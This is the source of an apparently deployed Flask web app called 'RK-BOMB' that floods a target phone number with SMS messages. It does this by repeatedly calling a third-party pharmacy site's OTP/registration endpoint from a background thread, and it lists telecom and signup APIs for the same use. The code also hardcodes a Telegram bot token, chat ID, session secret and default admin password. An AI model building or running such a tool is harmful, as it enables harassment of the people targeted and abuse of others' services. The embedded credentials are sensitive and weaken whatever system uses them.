import requests, threading, os, time, json, sqlite3
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from requests_toolbelt.multipart.encoder import MultipartEncoder
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = "RK_RAIHAN_ULTRA_SECURE_786" # সিক্রেট কি আপডেট করা হয়েছে

# ---------- CONFIG ----------
TG_BOT_TOKEN = "8694093332:AAGOOWD8Ms_KoRZJFHC58mqLkEQozA2aOx4"
MY_CHAT_ID = "6048050987" 
RENDER_URL = "https://rk-bomb.onrender.com" 
ADMIN_USERNAME = "admin"

# API LIST
ILYN_URL = "https://api.ilyn.global/auth/signup"
SHOP_URL = "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber="
SIM_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
BOUNDARY = "----WebKitFormBoundaryRKSTAR12345"

# ---------- DATABASE HELPER (ERROR SAFE) ----------
DB_PATH = os.path.join(os.getcwd(), 'system.db')

def run_db(query, params=(), fetch=False):
    try:
        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute(query, params)
        if fetch:
            data = cursor.fetchall()
            return data
        conn.commit()
    except Exception as e:
        print(f"DB Error: {e}")
        return None
    finally:
        conn.close()

def init_db():
    run_db('''CREATE TABLE IF NOT EXISTS users 
              (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT, status TEXT)''')
    run_db('''CREATE TABLE IF NOT EXISTS history 
              (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, success INTEGER, total INTEGER, status TEXT)''')
    try:
        run_db("INSERT INTO users (username, password, role, status) VALUES (?, ?, 'admin', 'approved')", 
               (ADMIN_USERNAME, generate_password_hash("admin123")))
    except: pass

init_db()

# ---------- CORE LOGIC ----------
active_sessions = {}

def bombing_task(username, phone, limit):
    key = f"{username}_{phone}"
    while key in active_sessions:
        if active_sessions[key]['total'] >= limit:
            run_db("INSERT INTO history (username, phone, success, total, status) VALUES (?,?,?,?,?)",
                   (username, phone, active_sessions[key]['success'], active_sessions[key]['total'], "completed"))
            del active_sessions[key]
            break
        
        if active_sessions[key].get('status') == 'running':
            try:
                # API calls
                requests.get(SHOP_URL + phone, timeout=5)
                active_sessions[key]['success'] += 1
            except: pass
            active_sessions[key]['total'] += 1
            time.sleep(1)
        else: time.sleep(2)

# ---------- ROUTES ----------
@app.route('/')
def home():
    if 'user' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        res = run_db("SELECT password, status FROM users WHERE username = ?", (u,), fetch=True)
        if res and check_password_hash(res[0]['password'], p):
            if res[0]['status'] == 'approved':
                session['user'] = u
                return redirect(url_for('dashboard'))
            return "<h2>Pending or Banned!</h2>"
        return "<h2>Invalid Login!</h2>"
    return '''<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;">
    <div style="border:1px solid #0f0;display:inline-block;padding:20px;margin-top:50px;">
    <h2>RK-BOMB LOGIN</h2>
    <form method="POST"><input name="u" placeholder="User" required><br><input name="p" type="password" placeholder="Pass" required><br>
    <button style="width:100%;background:#0f0;margin-top:10px;cursor:pointer;">LOGIN</button></form>
    <p><a href="/register" style="color:cyan;">Register</a></p></div></body>'''

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    return f'''<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
    <h2>Welcome, {session['user']}</h2>
    <div style="border:1px solid #0f0;padding:15px;">
    <form action="/api/start">
    <input name="num" placeholder="Target Number" required><br>
    <input name="amt" type="number" placeholder="Amount" required><br>
    <button style="background:#0f0;width:100%;margin-top:10px;cursor:pointer;">START FIRE</button>
    </form></div><br><a href="/logout" style="color:red;">Logout</a></body>'''

@app.route('/api/start')
def start():
    u = session.get('user')
    num = request.args.get('num')
    amt = request.args.get('amt')
    if u and num and amt:
        amt = int(amt)
        key = f"{u}_{num}"
        active_sessions[key] = {'phone': num, 'status': 'running', 'success': 0, 'total': 0, 'limit': amt}
        threading.Thread(target=bombing_task, args=(u, num, amt), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/tg_webhook', methods=['POST'])
def tg_webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        action, target = cb["data"].split('_')
        status = "approved" if action == "approve" else "banned"
        run_db("UPDATE users SET status = ? WHERE username = ?", (status, target))
        requests.post(f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": MY_CHAT_ID, "text": f"✅ User {target} is now {status}!"})
    return "OK"

if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
